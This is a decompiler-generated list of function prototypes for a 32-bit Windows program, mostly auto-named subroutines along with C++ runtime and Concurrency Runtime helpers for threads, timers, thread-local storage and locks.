_DWORD *__thiscall sub_42EC1C(_DWORD *this, char a2, int a3, char a4, unsigned __int8 a5);
int __thiscall sub_42ECA3(int this, char a2);
_DWORD *__thiscall sub_42ECD2(_DWORD *this, int a2, char a3, unsigned __int8 a4);
_DWORD *__thiscall sub_42ECFA(_DWORD *this);
_DWORD *__thiscall sub_42ED1A(_DWORD *this);
_DWORD *__thiscall sub_42ED37(_DWORD *this);
void __thiscall sub_42ED58(_DWORD *this);
unsigned int __thiscall sub_42ED78(_DWORD *this);
void __thiscall sub_42ED96(_DWORD *this);
void __thiscall sub_42EDE2(_DWORD *this);
_DWORD *__thiscall sub_42EE64(_DWORD *Block, char a2);
int __thiscall sub_42EE86(_DWORD **this);
void __thiscall sub_42EEA0(volatile signed __int32 *Block);
void __stdcall sub_42EEBE(int a1, void *Block, int a3);
HMODULE __stdcall sub_42EF1C(int a1, int (__thiscall ***a2)(_DWORD, _DWORD, _DWORD), int a3);
void __stdcall sub_42EF4F(void *Block, int a2);
void __stdcall sub_42EFA8(PVOID a1, BOOLEAN a2); // idb
int sub_42EFCB();
void __thiscall sub_42F05F(void *Block);
char __thiscall sub_42F078(volatile signed __int32 *Block);
int __thiscall sub_42F0AD(int (__thiscall ****this)(_DWORD, _DWORD, _DWORD), int a2);
char __thiscall sub_42F0CF(_DWORD *this, _DWORD *a2, int a3);
char __thiscall sub_42F129(int this, _DWORD *a2, int a3);
char __thiscall sub_42F182(volatile signed __int32 *Block, _DWORD *a2, int a3);
char __thiscall sub_42F1C9(volatile signed __int32 *Block, _DWORD *a2, int a3);
signed __int32 __thiscall sub_42F20C(volatile signed __int32 *this);
_DWORD *__thiscall sub_42F250(void *Block, _DWORD *a2, int a3);
_DWORD *__cdecl sub_42F305(_DWORD **a1, char a2);
int __thiscall sub_42F33F(_DWORD **this);
char __thiscall sub_42F358(_DWORD *this);
int __thiscall sub_42F38B(_DWORD **this);
char __thiscall sub_42F3A4(_BYTE *this);
char __thiscall sub_42F3C8(_BYTE *this);
char __thiscall sub_42F40B(_DWORD *this);
bool __thiscall sub_42F441(char *Parameter, DWORD DueTime);
void __thiscall sub_42F4A4(int this, unsigned __int8 a2);
void __thiscall sub_42F4F1(_DWORD *this);
void __thiscall sub_42F55C(_DWORD *this);
void __thiscall sub_42F5DA(volatile __int32 *this);
signed __int32 __thiscall sub_42F723(_DWORD ***this, void *a2);
unsigned int __thiscall sub_42F787(_DWORD ***this, DWORD DueTime);
char __thiscall sub_42F868(_DWORD ***this, void *a2, DWORD DueTime);
unsigned int __cdecl sub_42F950(_DWORD *a1, unsigned int a2, char a3, DWORD DueTime);
// _DWORD __thiscall std::regex_error::regex_error(std::regex_error *__hidden this, const struct std::regex_error *); idb
void __thiscall sub_42FC40(char *this);
int sub_42FC8F();
BOOL __cdecl sub_42FD38(HANDLE TimerQueue, HANDLE Timer, ULONG DueTime, ULONG Period);
BOOL __cdecl sub_42FD4F(HANDLE hObject);
int __cdecl sub_42FD5D(unsigned __int8 a1);
// int __cdecl __crtCreateSemaphoreExW_0(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); idb
BOOL __cdecl sub_42FDC8(PHANDLE phNewTimer, HANDLE TimerQueue, WAITORTIMERCALLBACK Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags);
int __cdecl sub_42FDE8(HANDLE TimerQueue, HANDLE Timer, HANDLE CompletionEvent); // idb
int __cdecl sub_42FE17(int a1);
struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *__cdecl sub_42FE39(PDWORD ReturnedLength);
void *__cdecl sub_42FEC0(int a1, size_t *a2);
ULONG sub_42FF74();
int __cdecl sub_42FFB7(int a1, int a2);
int __cdecl sub_430010(HANDLE hThread); // idb
__int64 j____crtGetTickCount64(void); // weak
int __cdecl sub_430023(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount); // idb
HANDLE __cdecl sub_430038(HANDLE hObject, WAITORTIMERCALLBACK Callback, PVOID Context);
int __cdecl sub_430088(HANDLE hThread, DWORD_PTR *a2);
BOOL __cdecl sub_4300CC(HANDLE hThread, int nPriority);
DWORD __cdecl sub_43010E(HANDLE hObjectToSignal, HANDLE hObjectToWaitOn, DWORD dwMilliseconds, BOOL bAlertable);
void __cdecl sub_430125(DWORD dwMilliseconds);
// BOOL __stdcall SwitchToThread();
DWORD sub_430139();
BOOL __cdecl sub_430176(DWORD dwTlsIndex);
LPVOID __cdecl sub_430184(DWORD dwTlsIndex);
BOOL __cdecl sub_430192(DWORD dwTlsIndex, LPVOID lpTlsValue);
BOOL __cdecl sub_4301D4(HANDLE WaitHandle);
DWORD __cdecl sub_4301E2(HANDLE hHandle, DWORD dwMilliseconds);
int __thiscall sub_4301F5(int this, char a2);
int *sub_430229();
int __cdecl sub_430237(int a1);
HMODULE __cdecl sub_430244(int a1);
HMODULE __cdecl sub_430280(DWORD dwExitCode);
uintptr_t sub_4302AA();
int __cdecl sub_4302F6(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); // idb
HMODULE sub_43033C();
int __cdecl sub_4303D0(unsigned int a1, int a2, int a3, char a4);
int __cdecl sub_43042F(int a1, int a2, int a3);
HMODULE __cdecl sub_430468(int a1, int a2);
HMODULE __cdecl sub_43049E(int a1, int a2);
__int32 __thiscall sub_4304D3(volatile __int32 *this);
__int32 __thiscall sub_4304E3(volatile __int32 *this);
int __thiscall sub_430514(_DWORD *this);
void sub_43051F();
char __thiscall sub_430528(volatile __int32 *this);
char __thiscall sub_430548(volatile __int32 *this);
int sub_43055D();
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
std::exception *__thiscall sub_4305A6(std::exception *this, char *a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
std::exception *__thiscall sub_4305F4(std::exception *this, char *a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
std::exception *__thiscall sub_430620(std::exception *this, char *a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
_DWORD *__thiscall sub_43065D(_DWORD *this, int a2);
_DWORD *__thiscall sub_43067A(_DWORD *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
int sub_4306A8();
int sub_4306C5(void); // weak
_DWORD *__thiscall sub_4306CA(_DWORD *this, int a2);
int __thiscall sub_4306EB(int this);
void *__thiscall sub_4307CF(_DWORD *this);
std::exception *__thiscall sub_4307DA(std::exception *this, struct std::exception *a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
std::exception *__thiscall sub_430806(std::exception *this, struct std::exception *a2);
void __thiscall sub_430821(void **this);
void __thiscall sub_43082E(char *this);
void __thiscall sub_430901(LPCRITICAL_SECTION *this);
_DWORD *__thiscall sub_430937(_DWORD *this);
// void *__thiscall Concurrency::details::GlobalCore::`vector deleting destructor'(Concurrency::details::GlobalCore *__hidden this, unsigned int); idb
void **__thiscall sub_4309CA(void **Block, char a2);
int __thiscall sub_4309F3(_DWORD *this, int a2);
unsigned int __thiscall sub_430A2C(int *this, unsigned int a2, unsigned int a3, unsigned int a4);
int __thiscall sub_430AFC(_DWORD *this, int a2);
int __cdecl sub_430B1F(int *a1);
int __cdecl sub_430B4A(_DWORD *a1);
int __thiscall sub_430B71(DWORD_PTR *this, HANDLE hThread);
ULONG_PTR sub_430B83();
void sub_430CA8();
_DWORD *__thiscall sub_430CC3(_DWORD *this, int a2);
unsigned int __thiscall sub_430DD0(_DWORD *this);
unsigned int __thiscall sub_430DF3(_DWORD *this);
unsigned int *__thiscall sub_430E20(unsigned int *this);
BOOL __thiscall sub_430F57(LPVOID lpParameter);
_DWORD __cdecl sub_430FB9();
char *__thiscall sub_430FBE(void *this, int a2);
volatile signed __int32 *sub_431020();
int __thiscall sub_4310B3(int this, int a2, int a3);
unsigned int __thiscall sub_431117(_DWORD *this);
void __thiscall sub_431130(_DWORD *this, void **Block);
void __thiscall sub_43116A(_DWORD *this);
_DWORD *__thiscall sub_431485(_DWORD *this);
bool __thiscall sub_4314EA(_DWORD *this);
void __thiscall sub_43168A(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5, unsigned int a6);
void __thiscall sub_4317C7(_DWORD *this, unsigned int a2, unsigned int a3);
int __thiscall sub_43195A(int *this);
void __thiscall sub_431B9C(_DWORD *this, _DWORD *a2, int a3, int a4, char a5);
void __thiscall sub_431C09(_DWORD *this, _DWORD *a2, _DWORD *a3, int a4, unsigned int a5);
int __stdcall sub_431D7C(LPVOID lpThreadParameter); // idb
void __thiscall sub_431D95(int this);
unsigned int __thiscall sub_431E95(_DWORD *this, unsigned int *a2, unsigned int *a3, int a4, int a5, unsigned int a6);
unsigned int __thiscall sub_4321D6(_DWORD *this, unsigned int a2, int a3, int a4);
char __thiscall sub_4322F0(_DWORD *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5);
int __thiscall sub_4323F9(_DWORD *this, __int16 a2);
_BYTE *__thiscall sub_43242D(_DWORD *this);
int sub_43245D();
int __thiscall sub_4324A8(_DWORD *this, unsigned int *a2);
int __thiscall sub_4325A1(_DWORD *this);
int __thiscall sub_4325A8(_DWORD *this);
int __thiscall sub_4325B2(_DWORD *this);
int __thiscall sub_4325B9(_DWORD *this);
int __thiscall sub_4325C0(int *this);
int __thiscall sub_4325D7(int *this);
int __thiscall sub_4325EE(_DWORD *this, int a2);
int __thiscall sub_432613(_DWORD *this, int a2);
int sub_432638();
int __thiscall sub_432683(_DWORD *this);
int sub_43268A(void); // weak
_DWORD __cdecl sub_43268F();
int sub_432694(void); // weak
// unsigned int __cdecl Concurrency::details::platform::GetNextAsyncId(Concurrency::details::platform *__hidden this); idb
void *__cdecl sub_4326A6(int a1);
unsigned int __thiscall sub_4326CF(_DWORD *this, _DWORD *a2, _DWORD *a3);
unsigned int __thiscall sub_4327E9(_DWORD *this, _DWORD *a2, _DWORD *a3);
void __thiscall sub_43292A(_DWORD *this);
char __thiscall sub_432960(int this, int a2, int a3, char a4);
unsigned int __thiscall sub_43299D(unsigned int *this, unsigned int a2, unsigned __int16 a3, unsigned __int16 a4, unsigned int a5, unsigned int a6, char a7);
void *__thiscall sub_432AB0(int this);
void __cdecl sub_432B72(char a1);
unsigned int __thiscall sub_432E07(_DWORD *this);
_DWORD *__thiscall sub_432E20(unsigned int *this, _DWORD *a2, int a3, char a4);
int __thiscall sub_432F76(_DWORD *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_43303C(_DWORD *this);
void __thiscall sub_433158(_DWORD *this);
unsigned int __thiscall sub_433226(_DWORD *this);
unsigned int __thiscall sub_433255(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_433467(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5);
signed __int32 __thiscall sub_433812(volatile signed __int32 *this);
char *__thiscall sub_43381C(void *this, int a2, int a3);
signed __int32 __thiscall sub_433860(int this);
unsigned int __thiscall sub_43390B(_DWORD *this, int a2, unsigned int a3, int a4);
char __thiscall sub_433960(_DWORD *this, int a2, _DWORD *a3, int a4);
int __thiscall sub_433A4A(_DWORD *this, int a2);
void __thiscall sub_433A80(int this, DWORD_PTR *Block);
_DWORD *__thiscall sub_433AF7(int this, _DWORD *a2, char a3);
unsigned int __thiscall sub_433C0C(_DWORD *this, int a2, unsigned int a3);
unsigned int __thiscall sub_433C40(_DWORD *this, int a2, unsigned int a3, int a4);
int __thiscall sub_433E1B(_DWORD *this);
__int32 sub_433E72();
void __cdecl sub_433F60(int a1, unsigned int a2);
char __thiscall sub_434118(volatile signed __int32 *this);
void __thiscall sub_434137(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_434303(_DWORD *this, int a2, char a3);
int __thiscall sub_4343C7(int this, _DWORD *a2);
_DWORD *__thiscall sub_434499(int this, _DWORD *a2);
_DWORD *__thiscall sub_4344ED(_DWORD *this, int a2, int a3, _DWORD *a4, _DWORD *a5, _DWORD *a6);
int sub_434554();
int __cdecl sub_43459D(int a1);
int __cdecl sub_4345C0(int a1);
int __cdecl sub_4345E5(int a1);
unsigned int *__thiscall sub_434608(unsigned int *this, unsigned int a2);
PSLIST_HEADER __thiscall sub_434646(PSLIST_HEADER ListHead, int a2, int a3, int a4);
_DWORD *__thiscall sub_43473D(_DWORD *this, int a2, int a3, _DWORD *a4);
_DWORD *__thiscall sub_434775(_DWORD *this, int a2, int a3, _DWORD *a4);
void __thiscall sub_4347AD(_DWORD *this);
_DWORD *__thiscall sub_4347C5(_DWORD *this, int a2);
HANDLE *__thiscall sub_43480B(HANDLE *this, const void **a2);
std::exception *__thiscall sub_434AE5(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_434B00(std::exception *this, struct std::exception *a2);
void __thiscall sub_434B2E(PSLIST_HEADER ListHead);
void __thiscall sub_434BD4(PSLIST_HEADER ListHead);
void __thiscall sub_434C6E(void **this);
void __thiscall sub_434C8F(void **this);
void __thiscall sub_434CA6(_DWORD *this);
void __thiscall sub_434CB4(char *this);
int __thiscall sub_434D6D(_DWORD **this);
int __thiscall sub_434DA3(_DWORD *this, int a2);
char *__thiscall sub_434DEB(char *this, char a2);
_DWORD *__thiscall sub_434E70(_DWORD *Block, char a2);
void *__thiscall sub_434E93(void *Block, char a2);
_DWORD *__thiscall sub_434EB8(_DWORD *Block, char a2);
_DWORD *__thiscall sub_434EFE(_DWORD *Block, char a2);
_DWORD *__thiscall sub_434F21(_DWORD *Block, char a2);
char *__thiscall sub_434F44(char *Block, char a2);
char *__thiscall sub_434F69(char *Block, char a2);
volatile signed __int32 *__thiscall sub_434FEC(_DWORD *this, signed __int32 a2);
signed __int32 __thiscall sub_435148(volatile signed __int32 *this, int a2);
int __thiscall sub_435179(int *this, int a2);
_DWORD *__thiscall sub_4351AD(void *this, _DWORD *a2);
void __thiscall sub_4351DA(volatile signed __int32 *this, _DWORD *a2);
int __thiscall sub_43520E(int this, int a2, unsigned int a3);
_DWORD *__thiscall sub_4352A4(void *this, int a2, _DWORD *a3);
_DWORD *__thiscall sub_4352DF(void *this, int a2, int a3);
int __thiscall sub_43532B(int this);
_DWORD *__thiscall sub_435371(volatile signed __int32 *this, char a2);
int __thiscall sub_4353E1(volatile signed __int32 *this);
int __thiscall sub_435404(int this);
int __thiscall sub_435442(_DWORD *this, ULONG DueTime);
unsigned int __cdecl sub_435513(int a1);
unsigned int __cdecl sub_43551F(int a1);
int *sub_43552B();
int *sub_435551();
char *__thiscall sub_4355B6(int this);
int __thiscall sub_435669(_DWORD *this);
int __thiscall sub_4356AC(int *this, unsigned int a2);
unsigned int __thiscall sub_43574C(_DWORD *this);
int __thiscall sub_4357D5(int this, int a2);
_DWORD *sub_435813();
int *__thiscall sub_43583F(int this, _DWORD *a2);
int *__thiscall sub_435848(void *this);
HANDLE *__cdecl sub_435867(int *a1);
int __thiscall sub_43588D(int this);
signed __int32 __thiscall sub_4358A6(int this);
int __thiscall sub_4358C4(int *this);
int __thiscall sub_4358E1(int *this);
int __thiscall sub_4358FB(int *this);
int __thiscall sub_43592F(HANDLE *this);
int __thiscall sub_43597A(volatile signed __int32 *this, struct _SINGLE_LIST_ENTRY *a2, char a3);
LPVOID sub_4359BC();
int sub_4359C9();
int __thiscall sub_4359E3(_DWORD *this);
int __thiscall sub_435A00(_DWORD **this);
_DWORD *__thiscall sub_435B2A(unsigned int *this, _DWORD *a2, _DWORD *a3);
int __thiscall sub_435B60(void *this);
int __thiscall sub_435BA1(unsigned int *this, _DWORD *a2);
int __stdcall sub_435BFA(int a1, int a2, _DWORD *a3, _DWORD *a4);
int __thiscall sub_435C25(_DWORD *this, int a2, int a3, _DWORD *a4);
char __thiscall sub_435C54(unsigned int *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7);
char __thiscall sub_435D5C(_DWORD *this);
char __thiscall sub_435D86(_DWORD *this);
int __thiscall sub_435E50(_DWORD *this);
_DWORD *__thiscall sub_435E59(unsigned int *this, _DWORD *a2, _DWORD *a3);
int sub_435F0F();
_DWORD *__thiscall sub_435FAC(union _SLIST_HEADER *this, char a2);
int __thiscall sub_43600C(int this, char a2);
signed __int32 __thiscall sub_43612F(volatile signed __int32 *this);
signed __int32 __thiscall sub_43613C(volatile signed __int32 *this);
// unsigned int __cdecl Concurrency::details::platform::GetNextAsyncId(Concurrency::details::platform *__hidden this); idb
int __thiscall sub_436156(int this);
int __stdcall sub_43618B(_DWORD *a1, int a2, _DWORD *a3);
int __thiscall sub_4361C7(_DWORD *this, int a2, int a3);
int __thiscall sub_4361F0(_DWORD *this);
int __thiscall sub_436211(_DWORD *this, int a2);
int __thiscall sub_436233(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_436268(const void **this, _DWORD *a2);
int __thiscall sub_43627E(union _SLIST_HEADER *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3);
int __thiscall sub_4362DB(union _SLIST_HEADER *this);
int __thiscall sub_4362F2(int *this);
PSLIST_ENTRY __cdecl sub_436305(char a1);
int __thiscall sub_436385(_DWORD *this, int a2);
void __thiscall sub_4363A8(void *this, int a2);
void __thiscall sub_436427(void **this, int a2);
bool __thiscall sub_436498(_DWORD *this);
int __cdecl sub_4364AB(int a1, unsigned int a2);
int __thiscall sub_4364D7(_DWORD *this);
int __thiscall sub_4364DE(_DWORD *this);
void __thiscall sub_436990(volatile signed __int32 *this);
_DWORD *__thiscall sub_436998(unsigned int *this, _DWORD *a2, _DWORD *a3);
int *__thiscall sub_436A00(int this, _DWORD *a2);
signed __int32 __thiscall sub_436AC6(void *this);
bool __thiscall sub_436B00(_DWORD *this, int a2);
int __thiscall sub_436B3C(int (__cdecl **this)(int), int (__cdecl *a2)(int), int (__cdecl *a3)(int), int a4);
int __thiscall sub_436B78(int this, int a2);
char __thiscall sub_436BBC(_DWORD *this);
bool __thiscall sub_436BD8(unsigned int *this, _DWORD *a2);
_DWORD *__thiscall sub_436C0C(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__stdcall sub_436C36(_DWORD *a1, int a2, int a3, int a4);
char __thiscall sub_436C47(_DWORD *this, _DWORD *a2);
char __thiscall sub_436C69(int this, struct _SINGLE_LIST_ENTRY *a2);
DWORD sub_436CF1();
BOOL sub_436D05();
void __thiscall sub_436D1E(_DWORD *this, signed __int64 a2);
int __thiscall sub_436ED4(int this);
int __thiscall sub_436F4A(int this);
signed __int32 __thiscall sub_436FE7(volatile signed __int32 *this);
signed __int32 __thiscall sub_436FFF(volatile signed __int32 *this, volatile signed __int32 *a2);
char __thiscall sub_43701D(unsigned int *this, struct _SINGLE_LIST_ENTRY *a2, int a3, int a4, int a5, int a6);
int __thiscall sub_43708A(void **this, void *a2);
signed __int32 __thiscall sub_4370C1(int this);
signed __int32 __thiscall sub_4370D1(volatile signed __int32 *this);
int __thiscall sub_437141(volatile signed __int32 *this);
void __thiscall sub_437160(volatile signed __int32 *this, HANDLE hSourceHandle);
signed __int32 __thiscall sub_437207(volatile signed __int32 *this);
PSLIST_ENTRY __thiscall sub_43721F(int this, struct _SINGLE_LIST_ENTRY *a2);
int __thiscall sub_437261(volatile signed __int32 *this);
PSLIST_ENTRY __thiscall sub_437280(int this, struct _SINGLE_LIST_ENTRY *a2, char a3);
PSLIST_ENTRY __thiscall sub_4372CA(int this, int a2);
PSLIST_ENTRY __thiscall sub_43731A(union _SLIST_HEADER *this);
BOOL __thiscall sub_437384(HANDLE *this, LONG lReleaseCount);
int __thiscall sub_4373A2(int *this, int a2);
char __thiscall sub_4373D4(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
char __thiscall sub_4374CD(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
int __thiscall sub_4375C6(int *this);
_DWORD *__thiscall sub_4375EE(_DWORD *this);
_DWORD *__thiscall sub_437612(int this);
void __thiscall sub_437646(int this, int a2);
char __thiscall sub_437682(union _SLIST_HEADER *this, int a2);
char __thiscall sub_43769A(_DWORD *this);
int __thiscall sub_4376A8(_DWORD *this, int a2, unsigned int a3);
signed __int32 __thiscall sub_437798(volatile signed __int32 *this);
char *__cdecl sub_4377DF(char *ListEntry);
LPVOID sub_437820();
char __thiscall sub_43783C(volatile signed __int32 *this);
int __thiscall sub_43785E(_DWORD *this, int a2, int a3);
int __thiscall sub_4378AF(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4);
void __thiscall sub_4378EC(_DWORD *this, int a2);
int __cdecl sub_437911(int *a1, int a2);
int __cdecl sub_437942(int *a1, int a2);
char __thiscall sub_43797C(unsigned int *this, int a2, int a3, int a4, int a5, int a6);
char __thiscall sub_4379A2(unsigned int *this, int a2, int a3, int a4, int a5, int a6, int a7);
char *sub_4379F7();
union _SLIST_HEADER *__thiscall sub_437A4D(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4);
int __thiscall sub_437B89(volatile signed __int32 *this);
char __thiscall sub_437C25(_DWORD *this);
char __stdcall sub_437D3B(int a1, _DWORD *a2, int a3);
char __stdcall sub_437D4A(_DWORD *a1, int a2);
void __stdcall Callback(_DWORD *a1, BOOLEAN a2);
int __thiscall sub_437D94(_DWORD *this, int a2);
int __cdecl sub_437E2B(char a1, char a2, int a3);
int __stdcall sub_437E96(char a1, unsigned __int8 a2, int a3);
int __thiscall sub_437EC0(int this, _DWORD *a2);
int __thiscall sub_437EF5(_DWORD *this);
int __thiscall sub_437F23(_DWORD *this, int a2);
unsigned int __thiscall sub_437F6B(_DWORD *this);
char __thiscall sub_437F9D(volatile signed __int32 *this, int a2);
int __thiscall sub_438051(int this, char a2);
void __thiscall sub_4380AE(int *this);
int __thiscall sub_4380FD(int *this, _DWORD *a2);
_DWORD *__thiscall sub_438132(_DWORD *this);
void *__thiscall sub_43814B(void *this, int a2, char a3);
void __thiscall sub_438221(void **this);
void __thiscall sub_438238(void **this);
void __thiscall sub_43824F(int this);
void __thiscall sub_43828B(_DWORD *this);
void __thiscall sub_438292(void *this);
void __thiscall sub_4382C0(void **this);
void __thiscall sub_4382D7(void *this);
bool __thiscall sub_438310(_DWORD *this, _DWORD *a2);
int __thiscall sub_438333(_DWORD *this, int a2);
_DWORD *__thiscall sub_438365(_DWORD *Block, char a2);
void *__thiscall sub_438388(void *Block, char a2);
void **__thiscall sub_4383AD(void **Block, char a2);
volatile signed __int32 *__thiscall sub_4383D9(_DWORD *this, signed __int32 a2);
void __thiscall sub_438535(volatile signed __int32 *this, int a2, char a3);
int __thiscall sub_43855F(int *this, _DWORD *a2);
void __thiscall sub_43858E(int this, _DWORD *a2);
void __thiscall sub_4385C2(int this, signed __int32 a2);
signed __int32 __thiscall sub_438629(volatile signed __int32 *this, signed __int32 a2);
void __thiscall sub_438659(int this, int a2);
char __cdecl sub_43874E(int a1);
char __thiscall sub_43875A(int *this, _DWORD *a2);
int __thiscall sub_4387A1(int this);
void __thiscall sub_4387DC(int *this);
BOOL sub_43881B();
int __thiscall sub_43882B(int this);
void **__stdcall sub_4388AE(_DWORD *a1);
int __thiscall sub_4388D0(int this);
char __thiscall sub_4388EB(int *this);
int __thiscall sub_438A2D(_DWORD *this);
int __thiscall sub_438A35(_DWORD *this);
int __thiscall sub_438A40(_DWORD *this);
int __thiscall sub_438A48(_DWORD *this);
char __thiscall sub_438A53(unsigned int *this, _DWORD *a2, _DWORD *a3);
_DWORD *__thiscall sub_438A95(_DWORD *this, int a2);
int __thiscall sub_438ADD(_DWORD *this);
int __thiscall sub_438AF1(_DWORD *this);
int __thiscall sub_438AF5(_DWORD *this);
int __thiscall sub_438AF9(_DWORD *this);
int __thiscall sub_438B0A(_DWORD *this);
bool __thiscall sub_438B32(_DWORD *this, int a2, int a3);
int __thiscall sub_438C0E(int this, int a2);
int __thiscall sub_438C31(int *this, int *a2);
int __thiscall sub_438C62(__int32 *this);
void *__thiscall sub_438CB3(_DWORD *this);
BOOL __thiscall sub_438CD1(_DWORD *lpTlsValue, int a2);
char __thiscall sub_438CEC(int this);
void __thiscall sub_438D6F(volatile signed __int32 *this);
char __thiscall sub_438D74(int *this);
_DWORD *__thiscall sub_438DCB(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_438E19(_DWORD *this, _DWORD **a2);
char __thiscall sub_438E47(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4);
void __thiscall sub_438F38(int this, _DWORD **a2);
void __thiscall sub_438F6C(void *this, int a2);
BOOL __thiscall sub_438F82(LPVOID lpTlsValue);
void __cdecl sub_438F91(void **Block);
int sub_438FB0(void); // weak
// void __usercall sub_438FB5(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_439037(volatile __int32 **this, unsigned __int8 (__cdecl *a2)(int, int), int a3, int (__cdecl *a4)(int, int));
int __thiscall sub_439043(void *this);
int __cdecl sub_4390DC(char a1, char a2, int a3, int a4);
int __stdcall sub_43914D(char a1, unsigned __int8 a2, int a3, int a4);
int __thiscall sub_43917A(__int32 *this, int a2);
int __thiscall sub_4391DD(_DWORD *this, int a2);
int __thiscall sub_4391EC(_DWORD *this);
int __thiscall sub_439200(void *this, _Mtx_t *a2, int a3);
// int __stdcall std::unique_lock<std::mutex>::unique_lock<std::mutex>(_Mtx_t); idb
int __thiscall sub_43925B(int this, int a2, int a3, int a4);
char *__thiscall sub_439286(char *this, int a2);
std::exception *__thiscall sub_4392CF(std::exception *this, struct std::exception *a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
volatile __int32 *__thiscall sub_4392FB(volatile __int32 *this, int a2, char a3);
std::exception *__thiscall sub_4393DC(std::exception *this, struct std::exception *a2);
void __thiscall sub_4393F7(_DWORD *this);
void __thiscall sub_43945B(void **this);
void __thiscall sub_43946B(char *this);
void __thiscall sub_439490(int this);
_DWORD *__thiscall sub_439571(_DWORD *Block, char a2);
char *__thiscall sub_439593(char *Block, char a2);
char *__thiscall sub_4395B5(char *Block, char a2);
_DWORD *__thiscall sub_4395FA(unsigned int *this, int a2, int a3);
_DWORD *__thiscall sub_43961D(unsigned int *this, int a2);
int __thiscall sub_43967D(_DWORD *this);
void __thiscall sub_439694(int this, char a2);
int __thiscall sub_4397C3(void *this, volatile __int32 **a2);
volatile __int32 *__thiscall sub_43980B(_DWORD *this);
void __thiscall sub_43988C(int this);
void __thiscall sub_4398DC(volatile __int32 *this, int a2, int a3);
void __stdcall sub_43997B(int a1, int a2);
void __thiscall sub_43999A(volatile signed __int32 *this, int a2);
void __thiscall sub_439A3E(int this, int a2, char a3);
bool __cdecl sub_439ACE(int a1, _DWORD *a2);
signed __int32 __thiscall sub_439AE1(int this);
int __thiscall sub_439B0F(int this, int a2);
int __thiscall sub_439BEB(int (__thiscall ***this)(void *, int));
int __thiscall sub_439C08(int this);
void __thiscall sub_439C1C(_DWORD ***this, int a2);
char *__thiscall sub_439D24(char *this);
char __thiscall sub_439D28(int this);
_DWORD *__thiscall sub_439D73(_DWORD *this);
signed __int32 __thiscall sub_439D89(volatile signed __int32 *this);
bool __thiscall sub_439E22(_DWORD *this);
bool __thiscall sub_439E34(_DWORD *this);
bool __thiscall sub_439E46(_DWORD *this);
bool __thiscall sub_439E51(_DWORD *this);
void __thiscall sub_439E59(int this, int a2);
int __thiscall sub_439EA8(_DWORD *this);
int __thiscall sub_439EAC(void *this, int a2, int a3, int a4);
int __thiscall sub_439EE9(int this, int a2);
signed __int32 __thiscall sub_439F69(volatile signed __int32 *this);
void __thiscall sub_439F90(volatile signed __int32 *Block);
void __thiscall sub_439FCA(int this, int a2);
char __thiscall sub_43A0C5(volatile signed __int32 *this, int a2);
char __cdecl sub_43A0FF(int a1, int a2);
bool __thiscall sub_43A118(_DWORD *this, char a2);
_DWORD *__thiscall sub_43A16C(_DWORD *this, int a2);
void __thiscall sub_43A1A8(_DWORD *this, int a2);
_DWORD *__cdecl sub_43A1ED(_DWORD *a1, unsigned int a2, char a3);
_DWORD *__thiscall sub_43A20B(_DWORD *this, const void **a2);
std::exception *__thiscall sub_43A232(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_43A24D(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_43A268(std::exception *this, struct std::exception *a2);
void __thiscall sub_43A283(void **this);
void **__thiscall sub_43A28F(void **this, const void **a2);
int __thiscall sub_43A2A8(_DWORD *this, unsigned int a2);
bool __cdecl sub_43A2DE(unsigned int a1, unsigned int a2);
_DWORD *__thiscall sub_43A2FC(_DWORD *this, unsigned int a2, int *a3);
_DWORD *__thiscall sub_43A3E5(void *this);
char *__cdecl sub_43A42D(unsigned int a1);
bool __cdecl sub_43A444(int a1, int a2);
int __thiscall sub_43A524(int *this);
_DWORD *__thiscall sub_43A55E(_DWORD *this, int a2, _DWORD *a3, int a4);
_DWORD *__thiscall sub_43A5BC(_DWORD *this, int a2, _DWORD *a3);
